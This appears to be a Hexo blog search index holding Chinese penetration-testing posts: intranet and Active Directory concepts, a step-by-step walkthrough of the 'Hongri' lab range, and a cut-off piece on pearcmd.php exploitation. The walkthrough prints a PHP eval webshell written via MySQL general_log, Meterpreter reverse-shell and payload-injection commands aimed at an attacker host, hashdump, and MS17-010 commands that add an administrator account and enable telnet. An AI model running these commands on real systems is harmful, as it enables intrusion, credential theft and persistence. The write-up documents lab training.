<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>内网渗透初探</title>
      <link href="/2024/04/25/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%88%9D%E6%8E%A2/"/>
      <url>/2024/04/25/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%88%9D%E6%8E%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="内网渗透初探"><a href="#内网渗透初探" class="headerlink" title="内网渗透初探"></a>内网渗透初探</h1><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>内网渗透（intranet exploitation）是对目标服务器getshell后，通过一系列技术手段对其所处的内网环境进行渗透，最终获取内网其他主机的权限的过程，这些通常涉及以下技术：</p><ul><li>内网信息收集</li><li>内网代理</li><li>权限提升</li><li>横向移动</li><li>……</li></ul><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><h5 id="工作组（work-group）"><a href="#工作组（work-group）" class="headerlink" title="工作组（work group）"></a>工作组（work group）</h5><p>分辨：在命令提示符界面执行systeminfo，回显结果的“域”信息为<strong>WORKGROUP</strong></p><p>简单来说，就是将不同的计算机按照功能或部门分别置于不同的组，<strong>适用于网络中计算机不多、资产规模较小、对安全管理控制要求不严格的情况</strong>，这是一种<strong>松散</strong>的资源管理模式，任何人都可以在局域网中创建新的工作任务而无需管理员同意，换言之，处于同一工作组中的主机彼此间地位平等，不存在额外关联或管理关系，对于此类情况，在内网渗透时需要逐个渗透与控制</p><p>在局域网内，计算机默认都是按照工作组的方式进行资源管理的</p><h5 id="域（domain）"><a href="#域（domain）" class="headerlink" title="域（domain）"></a>域（domain）</h5><p>分辨：在命令提示符界面执行systeminfo，回显结果的“域”信息为类似域名格式，由“.”连接的字符串</p><p>当组织中网络规模越来越大时，需要统一的管理和集中的身份验证，并能为用户提供更加方便地的网络资源搜索和使用方式时，就需要放弃工作组而使用域</p><p>域是一种比工作组更高级的的计算机资源管理模式，在域环境中，所有用户账户、用户组、计算机、打印机和其他安全主体都在一个或多个域控制器的中央数据库中注册；当域用户想访问域中的资源时，必须通过域控制器集中进行身份验证，通过身份验证的域用户在域中的身份决定了域用户对域中资源的访问权限</p><p>在域环境中，域管理员用户在域中具有最高访问权限和最高管理权限，在渗透过程中，获取域管理员相关权限往往可以控制整个域控</p><ul><li><p><strong>单域</strong></p><p>指网络环境中只有一个域</p><img src="http://www.yuyoung.fun/img/image-20240422105747792.png" alt="image-20240422105747792" style="zoom:33%;" /></li><li><p><strong>父域和子域</strong></p><p>某些情况下，需要在<strong>一个域中分出多个域</strong>，被划分的域称为父域，划分出来的域被称为子域，每个子域都拥有自己的安全策略，在有信任的情况下，父域可以访问子域</p><p>从域名上看，子域是域名中的一个段，用“.”进行域名分割，一个“.”代表域名的一个层级</p><img src="http://www.yuyoung.fun/img/image-20240422110502801.png" alt="image-20240422110502801" style="zoom:33%;" /></li><li><p><strong>域树</strong></p><p>域树是<strong>多个域</strong>通过建立信任关系组成的一个域集合</p><p>在域树中，所有的域共享同一表结构和配置，所有域名形成一个<strong>连续的名字空间</strong>，该命名空间具有连续性，域名层次越深，级别越低</p><img src="http://www.yuyoung.fun/img/image-20240422111951821.png" alt="image-20240422111951821" style="zoom: 50%;" /><p>在域树中，域管理员只能管理本域，不能访问或管理其他域，如果两个域之间要互相访问，就需要建立信任关系（trust relation）</p></li><li><p><strong>域林</strong></p><p>指由一个或多个没有<strong>形成连续名字空间</strong>的域树通过建立信任关系组成的域树集合，域林中所有域树共享同一个表结构、配置和全局目录</p><img src="http://www.yuyoung.fun/img/image-20240422113539493.png" alt="image-20240422113539493" style="zoom:50%;" /></li></ul><h5 id="域控制器"><a href="#域控制器" class="headerlink" title="域控制器"></a>域控制器</h5><p>域控制器（Domain Controller，DC）简称域控，是域环境核心的服务器计算机，用于在域中响应安全身份认证请求，负责允许或拒绝发出请求的主机访问域内资源，以及对用户进行身份验证、存储用户账户信息并执行域的安全策略等，域控包含一个活动目录数据库，其中存储着整个域的账户、密码、计算机等信息，而前面提到的身份验证便主要有以下步骤：</p><ul><li>该计算机是否属于本域</li><li>登录账号是否存在</li><li>密码是否正确</li></ul><p>一个域环境可以拥有一台或多台域控制器，每台域控都各自存储了一份所在域的活动目录AD的可写副本，对AD的修改都可以从源域控同步复制到域、域树或域林的其他控制器上，这样即使其中一台域控瘫痪，另一台域控也可以继续工作，保证域环境正常运行</p><h5 id="活动目录"><a href="#活动目录" class="headerlink" title="活动目录"></a>活动目录</h5><p>活动目录（Active Directory，AD）是常见的实现域的方法，活动目录指安装在域控上，为整个环境提供集中式目录管理服务的组件</p><p>AD存储了有关域环境中各种对象的信息，比如域、用户、用户组、计算机、组织单位、共享资源、安全策略等，目录数据存储在域控的Ntsd.dit文件中</p><p>在AD中，一个域中的基本对象有以下几种：</p><ul><li>DC，域控：存储网域所属的网域控制站</li><li>computer，域成员主机：加入网域的计算机对象</li><li>builtin，内置账户组群：规定了各类账户的权限</li><li>user，当前存在域中的用户：存储AD中的用户对象</li></ul><p>活动目录主要提供了以下功能：</p><ul><li><p>计算机集中管理</p><p>集中管理域内所有服务器及客户端计算机，统一下发组策略</p></li><li><p>用户集中管理</p><p>集中管理域用户、组织通讯录、用户组，对用户进行统一的身份认证、资源授权</p></li><li><p>资源集中管理</p><p>集中管理域中的打印机、文件共享服务等网络资源</p></li><li><p>环境集中管理</p><p>集中的配置域中计算机的工作环境，比如统一计算机桌面、统一网络连接配置、统一计算机安全配置等</p></li><li><p>应用集中管理</p><p>对域中计算机统一推送软件、安全补丁、防病毒系统、安装网络打印机等</p></li></ul><h5 id="常规安全域划分"><a href="#常规安全域划分" class="headerlink" title="常规安全域划分"></a>常规安全域划分</h5><p>即基于安全考量的域范围划分</p><ul><li><p>内网（安全级别最高）：分为核心区（存储企业最重要的数据，只有很少的主机能够访问）和生产&#x2F;办公区（员工日常工作区，一般能够访问DMZ，部分主机可以访问核心区）</p></li><li><p>DMZ（Demilitarized Zone，边界网络，隔离区，安全级别中等）：作为内网中安全系统和非安全系统之间的缓冲区，用于对外提供服务，一般可以放置一些必须公开的服务器设施</p></li><li><p>外网（Internet，安全级别最低）<br>拥有DMZ的网络需要制定一些访问控制策略：</p><p>  内网可以访问外网<br>  内网可以访问DMZ<br>  外网不能访问内网<br>  外网可以访问DMZ<br>  DMZ不能访问内网<br>  DMZ不能访问外网</p></li></ul><p>通常情况下，各类目标网络的安全级别是”外部网络 &lt; DMZ区 &lt; 核心区&#x2F;生产区”，而在内网渗透过程中，目标即为尽可能地获取最高级别网络中域环境的控制权，从而实现对业务的完全控制</p><p>但</p><h3 id="基于外部入侵生命周期的攻击流程设计"><a href="#基于外部入侵生命周期的攻击流程设计" class="headerlink" title="基于外部入侵生命周期的攻击流程设计"></a>基于外部入侵生命周期的攻击流程设计</h3><h5 id="网络杀伤链"><a href="#网络杀伤链" class="headerlink" title="网络杀伤链"></a>网络杀伤链</h5><p>网络杀伤链（Cyber-Kill-Chain）由七个步骤组成：</p><ul><li>侦察：可以理解为信息收集获取攻击入口点</li><li>武器化：根据漏洞或后门制作攻击武器，实现快速突破</li><li>投递：将武器向目标投递，例如钓鱼邮件、web访问、USB外设等</li><li>漏洞利用：当武器（恶意软件）触及到目标系统或终端时，会通过漏洞等方式，控制受害者的终端或业务系统服务器</li><li>安装：恶意软件安装一个新的后门或新的木马程序，以提升入侵者的访问权限，能接触到更多系统</li><li>命令与控制：通过前述各类攻击武器，攻击者可以进行命令控制操作，获得特权帐户的访问权限并尝试暴力攻击、搜索凭据并更改权限以接管控制权</li><li>目标行动：当攻击者接触到既定攻击目标时，可以对其进行各种既定行动（如盗窃机密数据、破坏&#x2F;加密数据进行勒索等）</li></ul><p>基于此模型，可以实现对网络攻击分阶段防御，降低攻击伤害</p><p>但此模型存在不足：</p><ul><li><p>抽象程度较高，不同的攻方、守方针对 同一个攻击事件 ，也会给出不同的描述，缺乏统一的描述机制和原语支撑</p></li><li><p>随着网络世界的复杂化，攻防不对称程度持续深化。针对同一个阶段，攻击方有无数种技术、方法可以使用，而防守方<br>却无法清晰描述和知晓自身的安全防护能力的全景实况 ，难以持续提升攻防对抗能力</p></li></ul><h5 id="ATT-CK"><a href="#ATT-CK" class="headerlink" title="ATT&amp;CK"></a>ATT&amp;CK</h5><p>ATT&amp;CK（Common Knowledge base of Adversary Tactics and Techniques）是一个战术知识库，提供了一个复杂框架，很好的弥补了CKC的高层抽象、未知威胁（IOC）以及特征之间的落差，对攻击行为进行了分类和特征化，让攻击防御不局限于琐碎的观察点</p><p>该战术库进行了一定程度的分类和抽象，具备了一定的防御IOC的能力，从框架上可以看出其非常详细：</p><p><img src="http://www.yuyoung.fun/img/6b2c75d55db34087a142232d6ad8d36f.png" alt="6b2c75d55db34087a142232d6ad8d36f"></p><h5 id="NTCTF"><a href="#NTCTF" class="headerlink" title="NTCTF"></a>NTCTF</h5><p>NTCTF（Technical Cyber Threat Framework）是一个基于ATT&amp;CK重新构造的网络威胁入侵过程模型</p><p>该模型通过4个层次构建：</p><ul><li>阶段</li><li>目标</li><li>行为</li><li>关键短语</li></ul><p>并把入侵过程分为六个阶段：</p><ul><li>行动管理</li><li>准备活动</li><li>接触目标和进攻突防</li><li>持久化驻留潜伏</li><li>效果</li><li>持续支撑作业</li></ul><p>每个阶段都由目标、行为和关键短语来提供支撑，而其中行为的核心支撑点就来自ATT&amp;CK战术知识库</p><h5 id="入侵生命周期"><a href="#入侵生命周期" class="headerlink" title="入侵生命周期"></a>入侵生命周期</h5><p>入侵生命周期把入侵过程分为了7个阶段：</p><ul><li><p>探索发现</p><p>在这个阶段中，攻击者会先锁定攻击对象，然后利用某些技术手段，尽可能多地获取目标暴露出来的信息，如通过端口扫描、指纹探测等方式，发现敏感端口及版本信息，进而寻找攻击点，为下一步入侵做准备</p></li><li><p>入侵和感染</p><p>在这个阶段，入侵者会根据“探索发现”阶段所发现的重要信息，来对目标暴露出的攻击面进行攻击尝试，在“探索发现”阶段收集到的信息越多，攻击对象所暴露的攻击面也就越多，攻击更易成功</p></li><li><p>探索感知</p><p>入侵者在成功进入系统内部后，由于是首次进入所以会出现对内部环境不熟悉的情况，这时入侵者的动作一般会是对当前所处环境进行探索，摸清内部大致的网络结构，常常伴随着被入侵本机的敏感信息收集以及对内网大量的端口进行扫描，后续根据入侵者的目的进行下一步操作</p></li><li><p>传播</p><p>在此阶段，入侵者根据上一阶段在内网探索感知收集到的信息，选择特定的攻击手法。如若发现内部是域环境，入侵者可能会尝试先攻破域控服务器，再传播其他机器。若是工作组环境，可能会利用收集到的端口和服务信息，选择特定漏洞进行批量扫描攻击，来尽可能多地继续获得其他计算机的控制权</p></li><li><p>持久化</p><p>入侵者在对资产进行恶意操作后，为了能够减少再次连接的攻击成本，方便下次进入，会进行“留后门”的操作，常见的后门如：建立计划任务，定时连接远程服务器；设置开机启动程序，在每次开机时触发执行特定恶意程序；新建系统管理员账号等。这样便于入侵者下次快速登录并控制该系统</p></li><li><p>攻击和利用</p><p>攻击者在此阶段便会开始对目标资产进行恶意操作，按照入侵者意愿，对能利用的数据进行窃取、利用；对操作系统、敏感文件进行破坏、删除。所有的防御手段都应该极力阻止入侵者进行到这一阶段</p></li><li><p>恢复</p><p>入侵者在执行所有的攻击操作时，往往会在系统上留下大量的行为日志，因此在这一阶段，入侵者会对记录自身痕迹的所有日志进行处理，或删除或混淆，从而消灭证据，逃避追踪</p></li></ul><p>入侵生命周期同样以ATT&amp;CK为基本战术知识库；并非所有的入侵都会经历上述7个阶段，各阶段也没有绝对的次序</p><p>参考文献&#x2F;网页：</p><p>[1]<a href="https://www.lockheedmartin.com/">https://www.lockheedmartin.com</a></p><p>[2]<a href="https://attack.mitre.org/">https://attack.mitre.org/</a></p><p>[3]<a href="https://zhuanlan.zhihu.com/p/264426122">https://zhuanlan.zhihu.com/p/264426122</a></p><p>[4]书籍《内网渗透体系建设》</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>红日靶场01 渗透过程记录</title>
      <link href="/2024/04/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA01%20ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0/"/>
      <url>/2024/04/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA01%20ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="红日靶场01-ATT-CK红队评估"><a href="#红日靶场01-ATT-CK红队评估" class="headerlink" title="红日靶场01 ATT&amp;CK红队评估"></a>红日靶场01 ATT&amp;CK红队评估</h1><h3 id="外网"><a href="#外网" class="headerlink" title="外网"></a>外网</h3><h5 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h5><p>首先扫描C段找一下目标站点IP：</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">netdiscover -i eth0 -r 192.168.221.0/24</span><br></pre></td></tr></table></figure><p>找到站点外网IP为<code>192.168.221.133</code></p><p><img src="https://yuy0ung.github.io/img/image-20240417123010268.png" alt="image-20240417123010268"></p><p>接下来进行端口扫描</p><p><img src="https://yuy0ung.github.io/img/image-20240417123136811.png" alt="image-20240417123136811"></p><p>发现80端口开启，并且站点开启了mysql服务</p><p>访问80端口，是一个phpinfo()页面，且可以进行mysql连接测试</p><p>使用root，root发现mysql存在弱口令</p><p><img src="https://yuy0ung.github.io/img/image-20240417123425756.png" alt="image-20240417123425756"></p><p>接下来使用dirsearch扫描一下网站目录，发现存在phpmyadmin后台</p><p><img src="https://yuy0ung.github.io/img/image-20240417123532333.png" alt="image-20240417123532333"></p><p>进入发现存在root，root弱口令，登陆成功，发现后台可执行sql语句，尝试写马</p><ul><li><p>查看数据库是否有导入权限，看能否直接导入木马</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="keyword">GLOBAL</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;%secure%&#x27;</span></span><br></pre></td></tr></table></figure><p>发现没有权限</p></li><li><p>查看是否有开启日志记录</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="keyword">GLOBAL</span> VARIABLES <span class="keyword">LIKE</span> ‘<span class="operator">%</span>general<span class="operator">%</span>’</span><br></pre></td></tr></table></figure><p>发现功能关闭</p></li><li><p>开启全局日志</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> general_log <span class="operator">=</span> <span class="keyword">ON</span></span><br></pre></td></tr></table></figure></li><li><p>指定日志写入到网站根目录</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">GLOBAL</span> general_log_file<span class="operator">=</span><span class="string">&#x27;C:/phpStudy/WWW/log.php&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>写马</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>访问log.php可查看日志，用蚁剑连接即可getshell</p><p><img src="https://yuy0ung.github.io/img/image-20240417181412963.png" alt="image-20240417181412963"></p></li></ul><p>用蚁剑连接后，发现目录存在其他网站，访问&#x2F;yxcms：</p><p>发现网站首页存在默认密码泄露，经尝试，可直接登入后台</p><p><img src="https://yuy0ung.github.io/img/image-20240417181813070.png" alt="image-20240417181813070"></p><p>进入后台，发现可以在前台模板写入一句话木马</p><p><img src="https://yuy0ung.github.io/img/image-20240417182449503.png" alt="image-20240417182449503"></p><p>查找路径为<code>/yxcms/protected/apps/default/view/default/shell2.php</code>，访问，连接成功</p><p><strong>tips</strong>：这里还存在目录浏览漏洞，访问没有默认页面的目录，可以遍历目录文件</p><h3 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h3><h5 id="可以使用msf生成exe并监听，远程连接目标机"><a href="#可以使用msf生成exe并监听，远程连接目标机" class="headerlink" title="可以使用msf生成exe并监听，远程连接目标机"></a>可以使用msf生成exe并监听，远程连接目标机</h5><ul><li><p>启动msfconsole：</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure></li><li><p>选择生成反向连接程序</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">use payload windows/x64/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure></li><li><p>设置参数（攻击机ip和端口）</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> LHOST 192.168.221.128</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> LPORT 5555</span><br></pre></td></tr></table></figure></li><li><p>生成exe：</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">generate -f exe -o 64.exe</span><br></pre></td></tr></table></figure></li><li><p>设置监听：</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br></pre></td></tr></table></figure></li><li><p>设置各参数：</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> LHOST 0.0.0.0</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> LPORT 5555</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure></li></ul><h5 id="上传并运行exe文件"><a href="#上传并运行exe文件" class="headerlink" title="上传并运行exe文件"></a>上传并运行exe文件</h5><p>用蚁剑向目标机的C盘上传64.exe，开启终端运行该程序：</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">phpStudy</span>\<span class="title">WWW</span>&gt; <span class="title">cd</span> <span class="title">C</span>:\</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\&gt; 64.<span class="title">exe</span></span></span><br></pre></td></tr></table></figure><p>成功反连：</p><p><img src="https://yuy0ung.github.io/img/image-20240418013613639.png" alt="image-20240418013613639"></p><ul><li><p>提权</p><p>getuid查看权限，发现已经是system权限（看网上都是administrator，需要getsystem简单提权一下，这里不知道为什么不一样）</p></li><li><p>获取账号密码</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">hashdump</span><br></pre></td></tr></table></figure></li></ul><p>接下来可以将shell派发给cobaltstrike</p><ul><li><p>在cs上开启监听</p></li><li><p>在msf上执行命令：</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">use exploit/windows/local/payload_inject</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_http</span><br><span class="line"><span class="built_in">set</span> DisablePayloadHandler <span class="literal">true</span>   <span class="comment">#payload_inject执行之后会在本地产生一个新的handler，设置为true表示不重复生成</span></span><br><span class="line"><span class="built_in">set</span> lhost xxxx                 <span class="comment">#公网vps ip</span></span><br><span class="line"><span class="built_in">set</span> lport 14444                 <span class="comment">#监听端口 </span></span><br><span class="line"><span class="built_in">set</span> session 1                   <span class="comment">#派发session id</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></li><li><p>连接成功</p></li></ul><h5 id="也可以使用cobalt-strike生成exe上传并连接"><a href="#也可以使用cobalt-strike生成exe上传并连接" class="headerlink" title="也可以使用cobalt strike生成exe上传并连接"></a>也可以使用cobalt strike生成exe上传并连接</h5><p>因为msf</p><p>连接成功<img src="https://yuy0ung.github.io/img/image-20240418173544925.png" alt="image-20240418173544925"></p><p>右键目标机在session中将sleep时长调整为1，加快回显速度</p><p>再右键点击interact打开交互界面，查看权限：</p><p><img src="https://yuy0ung.github.io/img/image-20240418174629353.png" alt="image-20240418174629353"></p><p>这里依旧是system权限，如果是administrator，可以参考如下方法提权：</p><ul><li><p>查看系统信息</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">shell systeminfo</span><br></pre></td></tr></table></figure><p>可以看见只有4个补丁</p><p><img src="https://yuy0ung.github.io/img/image-20240418174935455.png" alt="image-20240418174935455"></p></li><li><p>直接使用CS上的ms14_058提权即可（也可直接getsystem）</p></li></ul><h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><p>横向渗透前，先将该web服务器配置为代理服务器当作跳板机</p><ul><li><p>用msf直接搭建sock隧道：</p><p>进入session，自动创建路由：</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">run post/multi/manage/autoroute</span><br></pre></td></tr></table></figure></li></ul><p><img src="https://yuy0ung.github.io/img/image-20240418182412942.png" alt="image-20240418182412942"></p><ul><li><p>查看路由</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">run autoroute -p</span><br></pre></td></tr></table></figure><p><img src="https://yuy0ung.github.io/img/image-20240418182617722.png" alt="image-20240418182617722"></p></li><li><p>退到上层，使用socks进行代理，端口与proxychains里设置一致即可：</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">background</span><br><span class="line"></span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> VERSION 4a</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> SRVHOST 127.0.0.1</span><br><span class="line"></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>成功挂起一个job</p><p><img src="https://yuy0ung.github.io/img/image-20240418184255512.png" alt="image-20240418184255512"></p><p>修改proxychains4.conf</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vim /etc/proxychains4.conf:</span><br></pre></td></tr></table></figure></li><li><p>arp 探测内网存活主机</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">use post/windows/gather/arp_scanner</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> RHOSTS 192.168.52.0/24</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> SESSION 1</span><br><span class="line"></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>发现结果</p><p><img src="https://yuy0ung.github.io/img/image-20240418185755706.png" alt="image-20240418185755706"></p></li><li><p>udp协议探测内网存活主机</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/discovery/udp_sweep</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> RHOSTS 192.168.52.0/24</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://yuy0ung.github.io/img/image-20240418211609907.png" alt="image-20240418211609907"></p><p>查看结果发现有三个内网主机存活分别是：</p><ul><li>192.168.221.138</li><li>192.168.221.141</li><li>192.168.221.143</li></ul></li><li><p>开始进行域内信息收集</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">net view                 <span class="comment"># 查看局域网内其他主机名</span></span><br><span class="line">net config Workstation   <span class="comment"># 查看计算机名、全名、用户名、系统版本、工作站、域、登录域</span></span><br><span class="line">net user                 <span class="comment"># 查看本机用户列表</span></span><br><span class="line">net user /domain         <span class="comment"># 查看域用户</span></span><br><span class="line">net localgroup administrators <span class="comment"># 查看本地管理员组（通常会有域用户）</span></span><br><span class="line">net view /domain         <span class="comment"># 查看有几个域</span></span><br><span class="line">net user 用户名 /domain   <span class="comment"># 获取指定域用户的信息</span></span><br><span class="line">net group /domain        <span class="comment"># 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）</span></span><br><span class="line">net group 组名 /domain    <span class="comment"># 查看域中某工作组</span></span><br><span class="line">net group <span class="string">&quot;domain admins&quot;</span> /domain  <span class="comment"># 查看域管理员的名字</span></span><br><span class="line">net group <span class="string">&quot;domain computers&quot;</span> /domain  <span class="comment"># 查看域中的其他主机名</span></span><br><span class="line">net group <span class="string">&quot;doamin controllers&quot;</span> /domain  <span class="comment"># 查看域控制器主机名（可能有多台）</span></span><br></pre></td></tr></table></figure></li><li><p>在shell中查看域信息</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">net view</span><br></pre></td></tr></table></figure><p><img src="https://yuy0ung.github.io/img/image-20240420181326090.png" alt="image-20240420181326090"></p><p>查看主域信息</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">net view /domain</span><br></pre></td></tr></table></figure><p><img src="https://yuy0ung.github.io/img/image-20240418214105971.png" alt="image-20240418214105971"></p></li><li><p>横向渗透控制其他主机</p><p>对其他内网主机进行端口探测</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">proxychains nmap -sS -sV -Pn 192.168.52.141</span><br></pre></td></tr></table></figure><p><img src="https://yuy0ung.github.io/img/image-20240419010914517.png" alt="image-20240419010914517"></p><p>发现开放了445端口，可以尝试MS17_010进行攻击</p><p><img src="https://yuy0ung.github.io/img/image-20240419013306832.png" alt="image-20240419013306832"></p><p>漏洞存在，尝试getshell</p><p>使用psexec失败</p><img src="https://yuy0ung.github.io/img/image-20240419013713406.png" alt="image-20240419013713406"  /><p>试试其他的：</p><p><img src="https://yuy0ung.github.io/img/image-20240419014237117.png" alt="image-20240419014237117"></p><p>经尝试，可使用command来getshell</p><p><img src="https://yuy0ung.github.io/img/image-20240419014401696.png" alt="image-20240419014401696"></p><p>接下来尝试添加用户</p><p>由于密码设置策略，密码不能太简单且不能包含用户名</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> COMMAND net user yuyoung songxue@123 /add</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>然后把添加的用户加入管理员组</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> COMMAND net localgroup administrators yuyoung /add</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>一般可以打开3389远连，这里使用23端口的telnet服务</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> COMMAND sc config tlntsvr start= auto</span><br><span class="line"></span><br><span class="line">run</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> COMMAND net start telnet</span><br><span class="line"></span><br><span class="line">run</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> COMMAND netstat -an</span><br><span class="line"><span class="comment">#查看一下23端口号是否开启</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://yuy0ung.github.io/img/image-20240419020818483.png" alt="image-20240419020818483"></p><p>成功</p><p>接下来telnet连接</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/telnet/telnet_login</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> RHOSTS 192.168.52.141</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> username yuyoung</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> PASSWORD songxue@123</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>登陆成功</p><p><img src="https://yuy0ung.github.io/img/image-20240420183510734.png" alt="image-20240420183510734"></p><p>直接telnet建立会话</p><p><img src="https://yuy0ung.github.io/img/image-20240420183908971.png" alt="image-20240420183908971"></p><p>成功拿下成员主机</p><p>ctrl+] 再输入q退出telnet</p></li><li><p>转换方向，尝试拿下域控</p><p>首先扫描端口</p><p><img src="https://yuy0ung.github.io/img/image-20240420182134944.png" alt="image-20240420182134944"></p><p>开放了445端口，再次尝试永恒之蓝</p><p>不知道是不是防火墙的原因，不成功，最后使用CS直接横向移动getshell</p><p><img src="https://yuy0ung.github.io/img/image-20240420202537589.png" alt="image-20240420202537589"></p></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>pearcmd.php的利用</title>
      <link href="/2024/03/27/pearcmd/"/>
      <url>/2024/03/27/pearcmd/</url>
      
        <content type="html"><![CDATA[<h1 id="pearcmd-php的利用"><a href="#pearcmd-php的利用" class="headerlink" title="pearcmd.php的利用"></a>pearcmd.php的利用</h1><h3 id="关于pear"><a href="#关于pear" class="headerlink" title="关于pear"></a>关于pear</h3><p>pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。在7.3及以前，pecl&#x2F;pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定<code>--with-pear</code>才会安装</p><p>不过，在Docker任意版本镜像中，pcel&#x2F;pear都会被默认安装，安装的路径在<code>/usr/local/lib/php</code></p><p>要利用这个pearcmd.php需要满足几个条件</p><ul><li>要开启<code>register_argc_argv</code>这个选项（在Docker中自动开启）</li><li>要有文件包含的利用</li><li>确定pearcmd.php的位置，通常为&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php</li></ul><h3 id="register-argc-argv"><a href="#register-argc-argv" class="headerlink" title="register_argc_argv"></a>register_argc_argv</h3><p>如果环境中含有php.ini，则默认register_argc_argv&#x3D;Off；如果环境中没有php.ini，则默认register_argc_argv&#x3D;On</p><p>当开启了这个选项，用户的输入将会被赋予给$argc、$argv、$_SERVER[‘argv’]几个变量。</p><p>也就是说：当我们开启register_argc_argv选项的时候，$_SERVER[‘argv’]就会生效</p><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>pear会在pearcmd.php获取命令行参数：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title class_">PEAR_Command</span>::<span class="title function_ invoke__">setFrontendType</span>(<span class="string">&#x27;CLI&#x27;</span>);</span><br><span class="line"><span class="variable">$all_commands</span> = <span class="title class_">PEAR_Command</span>::<span class="title function_ invoke__">getCommands</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$argv</span> = <span class="title class_">Console_Getopt</span>::<span class="title function_ invoke__">readPHPArgv</span>();</span><br><span class="line"><span class="comment">// fix CGI sapi oddity - the -- in pear.bat/pear is not removed</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title 